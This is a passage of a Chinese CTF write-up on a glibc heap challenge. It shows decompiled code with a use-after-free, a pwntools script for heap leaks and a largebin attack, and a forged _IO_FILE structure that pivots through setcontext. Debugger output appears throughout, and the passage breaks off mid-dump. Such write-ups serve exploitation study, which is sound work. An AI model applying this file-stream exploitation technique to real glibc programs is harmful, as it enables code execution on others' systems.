class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *) <span class=\"number\">0x562fcda56370</span></span><br><span class=\"line\">$<span class=\"number\">7</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x451</span> &lt;error: Cannot access memory at address <span class=\"number\">0x451</span>&gt;,</span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x7f2b2d5cc0e0</span> &lt;main_arena+<span class=\"number\">1120</span>&gt; <span class=\"string\">&quot; t\\245\\315/V&quot;</span>,</span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x562fcda55290</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x562fcda55290</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x7f2b2d5cc840</span> &lt;_IO_2_1_stdout_+<span class=\"number\">192</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x1</span> &lt;error: Cannot access memory at address <span class=\"number\">0x1</span>&gt;,</span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x562fcda57cd0</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x7f2b2d405a6d</span> &lt;setcontext+<span class=\"number\">61</span>&gt; <span class=\"string\">&quot;H\\213\\242\\240&quot;</span>,</span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _chain = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _fileno = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _old_offset = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>,</span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _lock = <span class=\"number\">0x562fcda56000</span>,</span><br><span class=\"line\">    _offset = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x562fcda563a0</span>,</span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _mode = <span class=\"number\">-1</span>,</span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">19</span> times&gt;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  vtable = <span class=\"number\">0x7f2b2d5c80d0</span> &lt;_IO_wfile_jumps+<span class=\"number\">16</span>&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">pwndbg&gt; p _IO_file_jumps</span><br><span class=\"line\">$<span class=\"number\">8</span> = &#123;</span><br><span class=\"line\">  __dummy = <span class=\"number\">0</span>,</span><br><span class=\"line\">  __dummy2 = <span class=\"number\">0</span>,</span><br><span class=\"line\">  __finish = <span class=\"number\">0x7f2b2d43e070</span> &lt;_IO_new_file_finish&gt;,</span><br><span class=\"line\">  __overflow = <span class=\"number\">0x7f2b2d43ee40</span> &lt;_IO_new_file_overflow&gt;,</span><br><span class=\"line\">  __underflow = <span class=\"number\">0x7f2b2d43eb30</span> &lt;_IO_new_file_underflow&gt;,</span><br><span class=\"line\">  __uflow = <span class=\"number\">0x7f2b2d43fde0</span> &lt;__GI__IO_default_uflow&gt;,</span><br><span class=\"line\">  __pbackfail = <span class=\"number\">0x7f2b2d441300</span> &lt;__GI__IO_default_pbackfail&gt;,</span><br><span class=\"line\">  __xsputn = <span class=\"number\">0x7f2b2d43d680</span> &lt;_IO_new_file_xsputn&gt;,</span><br><span class=\"line\">  __xsgetn = <span class=\"number\">0x7f2b2d43d330</span> &lt;__GI__IO_file_xsgetn&gt;,</span><br><span class=\"line\">  __seekoff = <span class=\"number\">0x7f2b2d43c960</span> &lt;_IO_new_file_seekoff&gt;,</span><br><span class=\"line\">  __seekpos = <span class=\"number\">0x7f2b2d440530</span> &lt;_IO_default_seekpos&gt;,</span><br><span class=\"line\">  __setbuf = <span class=\"number\">0x7f2b2d43c620</span> &lt;_IO_new_file_setbuf&gt;,</span><br><span class=\"line\">  __sync = <span class=\"number\">0x7f2b2d43c4b0</span> &lt;_IO_new_file_sync&gt;,</span><br><span class=\"line\">  __doallocate = <span class=\"number\">0x7f2b2d430b90</span> &lt;__GI__IO_file_doallocate&gt;,</span><br><span class=\"line\">  __read = <span class=\"number\">0x7f2b2d43d9b0</span> &lt;__GI__IO_file_read&gt;,</span><br><span class=\"line\">  __write = <span class=\"number\">0x7f2b2d43cf40</span> &lt;_IO_new_file_write&gt;,</span><br><span class=\"line\">  __seek = <span class=\"number\">0x7f2b2d43c6f0</span> &lt;__GI__IO_file_seek&gt;,</span><br><span class=\"line\">  __close = <span class=\"number\">0x7f2b2d43c610</span> &lt;__GI__IO_file_close&gt;,</span><br><span class=\"line\">  __stat = <span class=\"number\">0x7f2b2d43cf30</span> &lt;__GI__IO_file_stat&gt;,</span><br><span class=\"line\">  __showmanyc = <span class=\"number\">0x7f2b2d4414a0</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class=\"line\">  __imbue = <span class=\"number\">0x7f2b2d4414b0</span> &lt;_IO_default_imbue&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>我们看到这里对应的入口点就是 xsputn。当__malloc_assert 进行 __fxprintf 调用的时候，进行错误输出的时候，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">__fxprintf  ————》》</span><br><span class=\"line\"></span><br><span class=\"line\">locked_vfxprintf  ————》》</span><br><span class=\"line\">__vfprintf_internal \t————》》\t\t//0x7f6fb038d15d &lt;__vfprintf_internal+173&gt;    call   *ABS*+0xab090@plt </span><br><span class=\"line\">__strchrnul_avx2;ret</span><br><span class=\"line\">__libc_cleanup_push_defer;ret</span><br><span class=\"line\">0x7f6fb038d1c8 &lt;__vfprintf_internal+280&gt;    call   qword ptr [r12 + 0x38]\t//调用目标函数&lt;__GI__IO_wfile_seekoff&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"下面我们直接来看题目\"><a class=\"markdownIt-Anchor\" href=\"#下面我们直接来看题目\">#</a> 下面我们直接来看题目。</h3>\n<p>开始的逆向过程就不再赘述。</p>\n<p>程序确实实现了增删改查的功能，但是对于改的次数做出了严格的限制，只允许进行两次更改，而且程序没有结束功能，也就是说，我们如果想利用 io 必须触发报错__malloc_assert。由于我们只有两次修改的机会，那么其实我们已经想好了怎么做，一次用来出发报错，一次用来伪造 io 结构。</p>\n<p>我们来看程序的实现，</p>\n<h4 id=\"add\"><a class=\"markdownIt-Anchor\" href=\"#add\">#</a> add</h4>\n<p>在创建的 chunk 的时候，最多允许我们创建 16 个 cat，并且对 size 的大小进行了限制</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">size &lt;= <span class=\"number\">0x417</span> || size &gt; <span class=\"number\">0x46F</span></span><br></pre></td></tr></table></figure>\n<p>只允许的 largebin 范围的堆块的创建</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">add</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 idx; <span class=\"comment\">// [rsp+0h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  writen(<span class=\"string\">&quot;plz input your cat idx:\\n&quot;</span>);</span><br><span class=\"line\">  idx = getint();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &gt; <span class=\"number\">0xF</span> || <span class=\"built_in\">list</span>[idx] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    writen(<span class=\"string\">&quot;invalid!\\n&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    writen(<span class=\"string\">&quot;plz input your cat size:\\n&quot;</span>);</span><br><span class=\"line\">    size = getint();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( size &lt;= <span class=\"number\">0x417</span> || size &gt; <span class=\"number\">0x46F</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      writen(<span class=\"string\">&quot;invalid size!\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">list</span>[idx] = <span class=\"built_in\">calloc</span>(<span class=\"number\">1uLL</span>, size);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( <span class=\"built_in\">list</span>[idx] )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        size_list[idx] = size;</span><br><span class=\"line\">        writen(<span class=\"string\">&quot;plz input your content:\\n&quot;</span>);</span><br><span class=\"line\">        read(<span class=\"number\">0</span>, <span class=\"built_in\">list</span>[idx], size_list[idx]);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        writen(<span class=\"string\">&quot;error!\\n&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>同时，因为使用 了 calloc 函数，会对我们申请出来的 chunk 进行一个初始化。read 允许我们输入空字符。</p>\n<p>接下来我们看看删除</p>\n<h4 id=\"delete\"><a class=\"markdownIt-Anchor\" href=\"#delete\">#</a> delete</h4>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">del</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v0; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  writen(<span class=\"string\">&quot;plz input your cat idx:\\n&quot;</span>);</span><br><span class=\"line\">  v0 = getint();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v0 &lt;= <span class=\"number\">0xF</span> &amp;&amp; <span class=\"built_in\">list</span>[v0] )</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(<span class=\"built_in\">list</span>[v0]);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    writen(<span class=\"string\">&quot;invalid!\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>明显的一个 uaf，可以用来泄露数据。</p>\n<p>所以我们在看下 show</p>\n<h4 id=\"show\"><a class=\"markdownIt-Anchor\" href=\"#show\">#</a> show</h4>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">show</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v0; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  writen(<span class=\"string\">&quot;plz input your cat idx:\\n&quot;</span>);</span><br><span class=\"line\">  v0 = getint();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v0 &lt;= <span class=\"number\">0xF</span> &amp;&amp; <span class=\"built_in\">list</span>[v0] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    writen(<span class=\"string\">&quot;Context:\\n&quot;</span>);</span><br><span class=\"line\">    write(<span class=\"number\">1</span>, <span class=\"built_in\">list</span>[v0], <span class=\"number\">0x30</span>uLL);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    writen(<span class=\"string\">&quot;invalid!\\n&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用 write，允许输出空字符，最多输出 0x30 字节，这已经够了，我们只要释放两个不相连的 chunk 就可以实现两地址的泄露，但是，这里要注意到，这个 uaf 的负面影响就是，我们不可以再向对应的 idx 申请 chunk，所以我们要控制数量。</p>\n<h4 id=\"攻击\"><a class=\"markdownIt-Anchor\" href=\"#攻击\">#</a> 攻击</h4>\n<p>简单的布局下 chunk，泄露出两个地址， 然后准备进行 largebinattack</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x450</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)     <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x418</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)     <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x430</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)     <span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">0x418</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)     <span class=\"comment\">#3</span></span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">0x440</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)     <span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">5</span>,<span class=\"number\">0x418</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">8</span>)  <span class=\"comment\">#5</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">free(<span class=\"number\">4</span>)</span><br><span class=\"line\">add(<span class=\"number\">6</span>,<span class=\"number\">0x460</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">8</span>)  <span class=\"comment\">#6</span></span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>chunk 的情况</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; heap</span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: <span class=\"number\">0x5609eb575000</span></span><br><span class=\"line\">Size: <span class=\"number\">0x291</span></span><br><span class=\"line\"></span><br><span class=\"line\">Free <span class=\"title function_\">chunk</span> <span class=\"params\">(largebins)</span> | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5609eb575290</span><br><span class=\"line\">Size: 0x451</span><br><span class=\"line\">fd: 0x7f2adf8f70e0</span><br><span class=\"line\">bk: 0x5609eb575b00</span><br><span class=\"line\">fd_nextsize: 0x5609eb575b00</span><br><span class=\"line\">bk_nextsize: 0x5609eb575b00</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk</span><br><span class=\"line\">Addr: 0x5609eb5756e0</span><br><span class=\"line\">Size: 0x420</span><br><span class=\"line\"></span><br><span class=\"line\">Free <span class=\"title function_\">chunk</span> <span class=\"params\">(largebins)</span> | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5609eb575b00</span><br><span class=\"line\">Size: 0x461</span><br><span class=\"line\">fd: 0x5609eb575290</span><br><span class=\"line\">bk: 0x7f2adf8f70e0</span><br><span class=\"line\">fd_nextsize: 0x5609eb575290</span><br><span class=\"line\">bk_nextsize: 0x5609eb575290</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk</span><br><span class=\"line\">Addr: 0x5609eb575f60</span><br><span class=\"line\">Size: 0x420</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5609eb576380</span><br><span class=\"line\">Size: 0x441</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5609eb5767c0</span><br><span class=\"line\">Size: 0x471</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5609eb576c30</span><br><span class=\"line\">Size: 0x1f3d1</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>接下来就是获取到_IO_list_all 的位置，然后进行伪造 iofile</p>\n<p>伪造的模板，作者已经提供了，这里是用到了 setcontext 进行参数的设置，我们需要手动更改下 fake_io_addr 的地址为我们控制的 chunk 地址，这里就是 largebin attack 生效的攻击地址。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fake_io_addr=heapbase+<span class=\"number\">0xb00</span></span><br><span class=\"line\">next_chain = <span class=\"number\">0</span></span><br><span class=\"line\">fake_IO_FILE=p64(<span class=\"number\">0</span>)*<span class=\"number\">6</span></span><br><span class=\"line\">fake_IO_FILE +=p64(<span class=\"number\">1</span>)+p64(<span class=\"number\">0</span>)<span class=\"comment\">#</span></span><br><span class=\"line\">fake_IO_FILE +=p64(fake_io_addr+<span class=\"number\">0xb0</span>)<span class=\"comment\">#_IO_backup_base=setcontext_rdx</span></span><br><span class=\"line\">fake_IO_FILE +=p64(setcontext+<span class=\"number\">61</span>)<span class=\"comment\">#_IO_save_end=call addr(call setcontext)</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0x58</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE += p64(<span class=\"number\">0</span>)  <span class=\"comment\"># _chain</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0x78</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE += p64(heapbase+<span class=\"number\">0x1000</span>)  <span class=\"comment\"># _lock = a writable address</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0x90</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE +=p64(fake_io_addr+<span class=\"number\">0x30</span>)<span class=\"comment\">#_wide_data,rax1_addr</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0xB0</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE += p64(<span class=\"number\">0</span>)  <span class=\"comment\"># _mode = 0</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0xC8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE += p64(libcbase+<span class=\"number\">0x2160c0</span>+<span class=\"number\">0x10</span>)  <span class=\"comment\"># vtable=IO_wfile_jumps+0x10</span></span><br><span class=\"line\">fake_IO_FILE +=p64(<span class=\"number\">0</span>)*<span class=\"number\">6</span></span><br><span class=\"line\">fake_IO_FILE += p64(fake_io_addr+<span class=\"number\">0x40</span>)  <span class=\"comment\"># rax2_addr</span></span><br></pre></td></tr></table></figure>\n<p>伪造好后的_io_file</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p &amp;_IO_list_all</span><br><span class=\"line\">$<span class=\"number\">1</span> = (<span class=\"keyword\">struct</span> _IO_FILE_plus **) <span class=\"number\">0x7f85fb7ee680</span> &lt;_IO_list_all&gt;</span><br><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus **) <span class=\"number\">0x7f85fb7ee680</span> </span><br><span class=\"line\">$<span class=\"number\">2</span> = (<span class=\"keyword\">struct</span> _IO_FILE_plus *) <span class=\"number\">0x563e47a6c370</span></span><br><span class=\"line\">pwndbg&gt; p*(<span class=\"keyword\">struct</span> _IO_FILE_plus *) <span class=\"number\">0x563e47a6c370</span></span><br><span class=\"line\">$<span class=\"number\">3</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x451</span> &lt;error: Cannot access memory at address <span class=\"number\">0x451</span>&gt;,</span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x7f85fb7ee0e0</span> &lt;main_arena+<span class=\"number\">1120</span>&gt; <span class=\"string\">&quot;\\320\\340~\\373\\205\\177&quot;</span>,</span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x563e47a6b290</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x563e47a6b290</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x7f85fb7ee660</span> &lt;_nl_global_locale+<span class=\"number\">224</span>&gt; <span class=\"string\">&quot;\\327\\341z\\373\\205\\177&quot;</span>,</span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x1</span> &lt;error: Cannot access memory at address <span class=\"number\">0x1</span>&gt;,</span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x563e47a6c420</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x7f85fb627a6d</span> &lt;setcontext+<span class=\"number\">61</span>&gt; <span class=\"string\">&quot;H\\213\\242\\240&quot;</span>,</span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _chain = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _fileno = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _old_offset = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>,</span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _lock = <span class=\"number\">0x563e47a6c000</span>,</span><br><span class=\"line\">    _offset = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x563e47a6c3a0</span>,</span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _mode = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">19</span> times&gt;</span><br><span class=\"line\">  &#125;,</span><br><span 